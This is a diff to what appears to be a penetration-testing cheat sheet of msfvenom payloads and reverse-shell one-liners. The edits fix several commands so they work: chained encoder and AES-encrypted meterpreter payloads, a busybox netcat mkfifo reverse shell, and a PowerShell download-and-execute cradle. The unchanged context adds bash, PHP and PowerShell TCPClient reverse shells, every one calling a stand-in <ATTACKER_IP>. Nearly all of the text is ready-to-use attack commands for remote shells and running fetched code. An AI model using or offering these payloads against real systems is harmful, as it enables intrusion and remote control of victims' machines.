@@ -135,9 +135,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -
 # List all encoders
 msfvenom --list encoders
 
-# Chained: encode raw then re-encode
+# Chained: encode raw then re-encode (second msfvenom needs -p - to read stdin)
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | \
-  msfvenom -e x86/countdown -i 3 -f exe -o chained.exe
+  msfvenom -p - -a x86 --platform windows -e x86/countdown -i 3 -f exe -o chained.exe
 ```
 
 > **Note:** Modern AV signatures all common encoder stubs. Encoders are useful for bad-char filtering in exploits, not for AV bypass. See [av-evasion.md](av-evasion.md).
@@ -176,9 +176,9 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 
 ### Payload Encryption (msfvenom 6+)
 
 ```bash
-# AES-256 encrypted payload
+# AES-256 encrypted payload (CBC mode — IV required; --encrypt-iv generates auto if omitted in some builds, supply explicitly to be safe)
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
-  --encrypt aes256 --encrypt-key <ENCRYPT_KEY> \
+  --encrypt aes256 --encrypt-key <ENCRYPT_KEY> --encrypt-iv <ENCRYPT_IV> \
   -f exe -o encrypted.exe
 
 # Available: --encrypt {xor,rc4,base64,aes256}
@@ -437,8 +437,8 @@ bash -c 'bash -i >& /dev/udp/<ATTACKER_IP>/4444 0>&1'
 # Embedded systems / minimal containers
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
 
-# busybox nc (no -e support typically)
-busybox nc <ATTACKER_IP> 4444 -e /bin/sh
+# busybox nc (no -e support — use mkfifo pattern instead)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER_IP> 4444 >/tmp/f
 ```
 
 ### Python
@@ -498,7 +498,9 @@ php -r '$sock=fsockopen("<ATTACKER_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ```powershell
 # Classic IEX one-liner (download cradle)
-powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1')"
+# .ps1 must contain the function CALL at the bottom (e.g. `Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>`)
+# OR append the call inline:
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>"
 
 # Native TCPClient reverse shell (no download required)
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
